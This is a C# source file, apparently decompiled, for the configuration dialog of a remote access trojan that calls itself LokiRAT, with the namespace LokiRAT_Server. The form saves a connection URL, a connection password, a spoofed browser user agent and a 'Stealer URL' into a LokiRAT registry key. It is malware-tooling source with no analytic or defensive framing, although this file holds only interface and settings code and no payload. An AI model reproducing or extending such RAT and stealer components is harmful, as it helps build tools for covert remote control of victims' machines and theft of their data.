namespace LokiRAT_Server
{
    using Microsoft.Win32;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class configuration : Form
    {
        private Button button1;
        private Button button2;
        private IContainer components = null;
        private GroupBox groupBox1;
        private Label label1;
        private Label label2;
        private Label label3;
        private Label label4;
        private TextBox textBox1;
        private TextBox textBox2;
        private TextBox textBox3;
        private TextBox textBox4;

        public configuration()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            main.connectionURL = this.textBox2.Text;
            main.connectionPass = this.textBox1.Text;
            main.userAgent = this.textBox3.Text;
            RegistryKey key = Registry.CurrentUser.CreateSubKey("LokiRAT");
            key.SetValue("connectionURL", this.textBox2.Text);
            key.SetValue("connectionPass", this.textBox1.Text);
            key.SetValue("userAgent", this.textBox3.Text);
            key.SetValue("stealerURL", this.textBox4.Text);
            base.Close();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void configuration_Load(object sender, EventArgs e)
        {
            main main = new main();
            this.textBox2.Text = main.connectionURL;
            this.textBox1.Text = main.connectionPass;
            if (main.userAgent == null)
            {
                this.textBox3.Text = "Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";
            }
            else
            {
                this.textBox3.Text = main.userAgent;
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.textBox1 = new TextBox();
            this.textBox2 = new TextBox();
            this.label1 = new Label();
            this.label2 = new Label();
            this.groupBox1 = new GroupBox();
            this.textBox4 = new TextBox();
            this.label4 = new Label();
            this.label3 = new Label();
            this.textBox3 = new TextBox();
            this.button1 = new Button();
            this.button2 = new Button();
            this.groupBox1.SuspendLayout();
            base.SuspendLayout();
            this.textBox1.Location = new Point(0x7f, 0x3d);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x76, 20);
            this.textBox1.TabIndex = 0;
            this.textBox2.Location = new Point(0x7f, 0x1d);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new Size(0xe4, 20);
            this.textBox2.TabIndex = 1;
            this.label1.AutoSize = true;
            this.label1.Location = new Point(8, 0x40);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x71, 13);
            this.label1.TabIndex = 2;
            this.label1.Text = "Connection Password:";
            this.label2.AutoSize = true;
            this.label2.Location = new Point(0x20, 0x20);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x59, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "Connection URL:";
            this.groupBox1.Controls.Add(this.textBox4);
            this.groupBox1.Controls.Add(this.label4);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.textBox3);
            this.groupBox1.Controls.Add(this.label2);
            this.groupBox1.Controls.Add(this.textBox1);
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.Controls.Add(this.textBox2);
            this.groupBox1.Location = new Point(12, 12);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new Size(0x169, 160);
            this.groupBox1.TabIndex = 4;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Admin Configuration";
            this.textBox4.Location = new Point(0x7f, 0x7f);
            this.textBox4.Name = "textBox4";
            this.textBox4.Size = new Size(0xe4, 20);
            this.textBox4.TabIndex = 7;
            this.label4.AutoSize = true;
            this.label4.Location = new Point(0x35, 130);
            this.label4.Name = "label4";
            this.label4.Size = new Size(0x44, 13);
            this.label4.TabIndex = 6;
            this.label4.Text = "Stealer URL:";
            this.label3.AutoSize = true;
            this.label3.Location = new Point(0x3d, 0x62);
            this.label3.Name = "label3";
            this.label3.Size = new Size(60, 13);
            this.label3.TabIndex = 5;
            this.label3.Text = "UserAgent:";
            this.textBox3.Location = new Point(0x7f, 0x5f);
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new Size(0xe4, 20);
            this.textBox3.TabIndex = 4;
            this.button1.Location = new Point(0x101, 0xbb);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x74, 0x18);
            this.button1.TabIndex = 5;
            this.button1.Text = "OK";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.button2.Location = new Point(0x8b, 0xbb);
            this.button2.Name = "button2";
            this.button2.Size = new Size(0x70, 0x18);
            this.button2.TabIndex = 6;
            this.button2.Text = "Cancel";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new EventHandler(this.button2_Click);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x181, 0xdd);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.groupBox1);
            base.Controls.Add(this.button2);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "configuration";
            this.Text = "Configuration | LokiRAT";
            base.Load += new EventHandler(this.configuration_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            base.ResumeLayout(false);
        }
    }
}

